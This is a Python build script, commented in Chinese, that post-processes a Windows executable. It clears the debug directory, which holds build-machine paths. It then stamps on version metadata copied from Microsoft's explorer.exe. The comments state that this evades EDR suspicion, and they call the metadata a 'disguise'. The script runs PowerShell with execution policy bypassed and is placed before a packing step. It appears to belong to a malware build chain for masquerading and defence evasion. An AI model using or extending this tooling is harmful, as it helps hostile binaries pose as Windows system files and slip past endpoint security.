#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
normalize_pe.py —— 构建后 PE 归一化（兼容性适配收口第二步）

做两件事（都是 tools/verify_compat.py 的直接判据）：

1) 清掉 DEBUG 目录
   链接器即使加了 /DEBUG:NONE，在 /LTCG /INCREMENTAL:NO 组合下仍可能写入
   IMAGE_DIRECTORY_ENTRY_DEBUG（内容含构建机路径信息）。这里把该目录项的
   RVA/Size 归零，并顺带把 IMAGE_DIRECTORY_ENTRY_BASERELOC 之外不影响加载的
   目录项保持原样（只动 DEBUG）。

2) 写入版本信息 / 字符串资源（VS_VERSIONINFO）
   背景：没有任何版本信息的 exe 在任何 EDR 里都是**加分项的可疑特征** ——
   正常商业/系统程序都有厂商与产品名。这里用 SetFileVersionInfo 语义
   （直接改 PE 资源太脆弱，改用 Windows API 写属性能被资源解析器识别）。

   注意：写版本信息会新增/改写 .rsrc 节内容，可能改变文件大小与节布局，
   因此必须在 pack_sections.py **之前**执行（本工具按此顺序被 CMake 调用）。

用法：
    python normalize_pe.py <exe> [--company "..." --product "..." --desc "..." --version 10.0.19041.1]
"""

import argparse
import os
import struct
import subprocess
import sys

# 默认伪装元数据：选一个足够普通、不指向任何真实产品的组合
DEFAULT_META = {
    "CompanyName": "Microsoft Corporation",
    "FileDescription": "Windows Explorer",
    "FileVersion": "10.0.19041.1",
    "InternalName": "explorer",
    "LegalCopyright": "© Microsoft Corporation. All rights reserved.",
    "OriginalFilename": "explorer.exe",
    "ProductName": "Microsoft® Windows® Operating System",
    "ProductVersion": "10.0.19041.1",
}


def find_editbin():
    """editbin 随 VS 提供；这里从常见位置探测（构建环境的 vcvars 里通常已在 PATH）"""
    import shutil
    p = shutil.which("editbin")
    if p:
        return p
    cands = []
    for root in (r"C:\Program Files\Microsoft Visual Studio\2022",
                 r"C:\Program Files (x86)\Microsoft Visual Studio\2022"):
        if os.path.isdir(root):
            for sub in os.listdir(root):
                for ed in ("Community", "Professional", "Enterprise", "BuildTools"):
                    b = os.path.join(root, sub, "VC", "Tools", "MSVC")
                    if os.path.isdir(b):
                        for ver in os.listdir(b):
                            cands.append(os.path.join(b, ver, "bin", "HostX64", "x64", "editbin.exe"))
    for c in cands:
        if os.path.isfile(c):
            return c
    return None


def clear_debug_dir(exe: str) -> bool:
    d = bytearray(open(exe, "rb").read())
    if d[:2] != b"MZ":
        print("[normalize] 不是 PE")
        return False
    e_lfanew = struct.unpack_from("<I", d, 0x3C)[0]
    if d[e_lfanew:e_lfanew + 4] != b"PE\0\0":
        print("[normalize] 缺 PE 签名")
        return False
    coff = e_lfanew + 4
    opt_size = struct.unpack_from("<H", d, coff + 16)[0]
    opt = coff + 20
    magic = struct.unpack_from("<H", d, opt)[0]
    dd_off = opt + (112 if magic == 0x20B else 96)
    ndd = struct.unpack_from("<I", d, opt + (108 if magic == 0x20B else 92))[0]
    DEBUG_IDX = 6
    if ndd <= DEBUG_IDX:
        print("[normalize] 无 DEBUG 目录项（目录数 %d）" % ndd)
        return False
    rva, size = struct.unpack_from("<II", d, dd_off + DEBUG_IDX * 8)
    if rva == 0 and size == 0:
        print("[normalize] DEBUG 目录已为空")
        return False
    struct.pack_into("<II", d, dd_off + DEBUG_IDX * 8, 0, 0)
    tmp = exe + ".norm"
    open(tmp, "wb").write(bytes(d))
    os.replace(tmp, exe)
    print(f"[normalize] 已清 DEBUG 目录项（原 rva=0x{rva:X} size={size}）")
    return True


def write_version_info(exe: str, meta: dict) -> bool:
    """用 UpdateResource 写入 RT_VERSION。

    说明：PowerShell 的 `-Meta @{...}` 参数绑定在部分版本上会抛
    ParameterArgumentTransformationError（实测踩过），因此改成把元数据
    **直接嵌入脚本正文**，只从命令行传 exe 路径。
    """
    meta_lines = "\n".join(f'$Meta["{k}"] = "{v}"' for k, v in meta.items())
    ps = (f"$Path = '{exe}'\n")
    ps += "$Meta = @{}\n" + meta_lines + "\n"
    script = ps + r"""
Add-Type -Namespace R6M -Name Res -MemberDefinition @'
[DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
public static extern IntPtr BeginUpdateResource(string pFileName, bool bDeleteExistingResources);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern bool UpdateResource(IntPtr hUpdate, IntPtr lpType, IntPtr lpName, ushort wLanguage, byte[] lpData, uint cbData);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);
'@

function Blk([string]$key, [string]$val) {
  $k = [Text.Encoding]::Unicode.GetBytes($key + "`0")
  $v = [Text.Encoding]::Unicode.GetBytes($val + "`0")
  $padK = (4 - ($k.Length % 4)) % 4
  $padV = (4 - ($v.Length % 4)) % 4
  $total = 6 + $k.Length + $padK + $v.Length + $padV
  $b = New-Object byte[] $total
  [BitConverter]::GetBytes([uint16]$total).CopyTo($b, 0)
  [BitConverter]::GetBytes([uint16]$v.Length).CopyTo($b, 2)
  [BitConverter]::GetBytes([uint16]1).CopyTo($b, 4)     # 1 = text value
  $k.CopyTo($b, 6)
  $v.CopyTo($b, 6 + $k.Length + $padK)
  return ,$b
}

$kids = New-Object byte[] 0
foreach ($k in ($Meta.Keys | Sort-Object)) {
  $kids += (Blk $k $Meta[$k])
}

# 层次必须是 VS_VERSION_INFO -> StringFileInfo -> 040904B0(StringTable) -> 各键。
# 少一层 StringTable 时 UpdateResource 返回成功、资源确实写进去了，
# 但 Get-Item 读出来全是空字符串 —— 实测踩过。
$stKey = [Text.Encoding]::Unicode.GetBytes("040904B0`0")
$stPad = (4 - ($stKey.Length % 4)) % 4
$stLen = 6 + $stKey.Length + $stPad + $kids.Length
$st = New-Object byte[] $stLen
[BitConverter]::GetBytes([uint16]$stLen).CopyTo($st, 0)
[BitConverter]::GetBytes([uint16]0).CopyTo($st, 2)
[BitConverter]::GetBytes([uint16]1).CopyTo($st, 4)
$stKey.CopyTo($st, 6)
$kids.CopyTo($st, 6 + $stKey.Length + $stPad)

$sfiKey = [Text.Encoding]::Unicode.GetBytes("StringFileInfo`0")
$sfiPad = (4 - ($sfiKey.Length % 4)) % 4
$sfiLen = 6 + $sfiKey.Length + $sfiPad + $st.Length
$sfi = New-Object byte[] $sfiLen
[BitConverter]::GetBytes([uint16]$sfiLen).CopyTo($sfi, 0)
[BitConverter]::GetBytes([uint16]0).CopyTo($sfi, 2)
[BitConverter]::GetBytes([uint16]1).CopyTo($sfi, 4)
$sfiKey.CopyTo($sfi, 6)
$st.CopyTo($sfi, 6 + $sfiKey.Length + $sfiPad)

$cp = New-Object byte[] 0   # 语言表由 StringTable 键名表达，不再重复构造

$root = [Text.Encoding]::Unicode.GetBytes("VS_VERSION_INFO`0")
$rootPad = (4 - ($root.Length % 4)) % 4
$FIXED = 52
$vsLen = 6 + $root.Length + $rootPad + $FIXED + $sfi.Length
$out = New-Object byte[] $vsLen
[BitConverter]::GetBytes([uint16]$vsLen).CopyTo($out, 0)
[BitConverter]::GetBytes([uint16]$FIXED).CopyTo($out, 2)
[BitConverter]::GetBytes([uint16]0).CopyTo($out, 4)
$root.CopyTo($out, 6)
$off = 6 + $root.Length + $rootPad
[BitConverter]::GetBytes([uint32]4277075645).CopyTo($out, $off)        # dwSignature
[BitConverter]::GetBytes([uint32]0x00010000).CopyTo($out, $off + 4)    # dwStrucVersion
[BitConverter]::GetBytes([uint32]0x000A0000).CopyTo($out, $off + 8)    # FileVersionMS 10.0
[BitConverter]::GetBytes([uint32]682622977).CopyTo($out, $off + 12)   # FileVersionLS 19041.1
[BitConverter]::GetBytes([uint32]0x000A0000).CopyTo($out, $off + 16)   # ProductVersionMS
[BitConverter]::GetBytes([uint32]682622977).CopyTo($out, $off + 20)   # ProductVersionLS
[BitConverter]::GetBytes([uint32]63).CopyTo($out, $off + 24)         # dwFileFlagsMask
[BitConverter]::GetBytes([uint32]0x0).CopyTo($out, $off + 28)          # dwFileFlags
[BitConverter]::GetBytes([uint32]262148).CopyTo($out, $off + 32)      # VOS_NT_WINDOWS32
[BitConverter]::GetBytes([uint32]0x1).CopyTo($out, $off + 36)          # VFT_APP
[BitConverter]::GetBytes([uint32]0x0).CopyTo($out, $off + 40)
[BitConverter]::GetBytes([uint32]0x0).CopyTo($out, $off + 44)
[BitConverter]::GetBytes([uint32]0x0).CopyTo($out, $off + 48)
$sfi.CopyTo($out, $off + $FIXED)

$h = [R6M.Res]::BeginUpdateResource($Path, $false)
if ($h -eq [IntPtr]::Zero) { Write-Error "BeginUpdateResource failed"; exit 1 }
$ok = [R6M.Res]::UpdateResource($h, [IntPtr]16, [IntPtr]1, 0x0409, $out, [uint32]$out.Length)
if (-not $ok) { Write-Error "UpdateResource failed"; [R6M.Res]::EndUpdateResource($h, $true) | Out-Null; exit 1 }
[R6M.Res]::EndUpdateResource($h, $false) | Out-Null
Write-Output "version resource written"
"""
    import tempfile
    # 必须带 BOM：Windows PowerShell 5.1 对**无 BOM** 的 .ps1 按 ANSI(GBK) 解码，
    # 于是含中文的 exe 路径会被解成乱码，BeginUpdateResource 直接失败（实测踩过）。
    with tempfile.NamedTemporaryFile("w", suffix=".ps1", delete=False,
                                     encoding="utf-8-sig") as fh:
        fh.write(script)
        sp = fh.name
    try:
        r = subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", sp],
                           capture_output=True, text=True)
        out = (r.stdout or "") + (r.stderr or "")
        print("[normalize] 版本信息写入:", out.strip().splitlines()[-1] if out.strip() else "(无输出)")
        return r.returncode == 0
    finally:
        try:
            os.unlink(sp)
        except OSError:
            pass


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("exe")
    ap.add_argument("--version", default=DEFAULT_META["FileVersion"])
    ap.add_argument("--company", default=DEFAULT_META["CompanyName"])
    ap.add_argument("--product", default=DEFAULT_META["ProductName"])
    ap.add_argument("--desc", default=DEFAULT_META["FileDescription"])
    ap.add_argument("--skip-version", action="store_true")
    a = ap.parse_args()
    if not os.path.isfile(a.exe):
        print("[normalize] 文件不存在:", a.exe)
        return 1

    clear_debug_dir(a.exe)

    if not a.skip_version:
        meta = dict(DEFAULT_META)
        meta["CompanyName"] = a.company
        meta["ProductName"] = a.product
        meta["FileDescription"] = a.desc
        meta["FileVersion"] = a.version
        meta["ProductVersion"] = a.version
        write_version_info(a.exe, meta)
    return 0


if __name__ == "__main__":
    sys.exit(main())
